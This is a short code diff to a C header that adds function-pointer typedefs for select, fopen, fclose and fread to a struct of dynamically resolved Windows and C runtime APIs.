@@ -15,6 +15,7 @@ typedef u_long(WINAPI* Tinet_addr)(const char*);
 typedef SOCKET(WINAPI* Tsocket)(int, int, int);
 typedef int(WINAPI* TWSAStartup)(WORD, LPWSADATA);
 typedef int(WINAPI* TWSAGetLastError)(void);
+typedef int(WINAPI* Tselect)(int, fd_set FAR*, fd_set FAR*, fd_set FAR*, const struct timeval FAR*);
 
 typedef void* (WINAPI* Tmemset)(void*, int, size_t);
 typedef void* (WINAPI* Tmalloc)(size_t);
@@ -31,6 +32,9 @@ typedef size_t(WINAPI* Twcstombs)(char*, wchar_t const*, size_t);
 typedef struct tm* (WINAPI* Tlocaltime)(__time64_t const*);
 typedef size_t(WINAPI* Tstrftime)(char*, size_t, char const*, struct tm const*);
 typedef int(WINAPI* T_snprintf)(char* const, size_t const, char const* const, ...);
+typedef FILE* (WINAPI* Tfopen)(char const*, char const*);
+typedef int(WINAPI* Tfclose)(FILE*);
+typedef size_t(WINAPI* Tfread)(void*, size_t, size_t, FILE*);
 
 typedef BOOL(WINAPI* TReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef BOOL(WINAPI* TWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
@@ -58,6 +62,7 @@ typedef struct ApiList {
 	Tinet_addr inet_addr;
 	TWSAStartup WSAStartup;
 	TWSAGetLastError WSAGetLastError;
+	Tselect select;
 
 	Tmemset memset;
 	Tmalloc malloc;
@@ -91,6 +96,9 @@ typedef struct ApiList {
 	Tlocaltime localtime;
 	Tstrftime strftime;
 	T_snprintf _snprintf;
+	Tfopen fopen;
+	Tfclose fclose;
+	Tfread fread;
 } API;
 
 void InitApis();
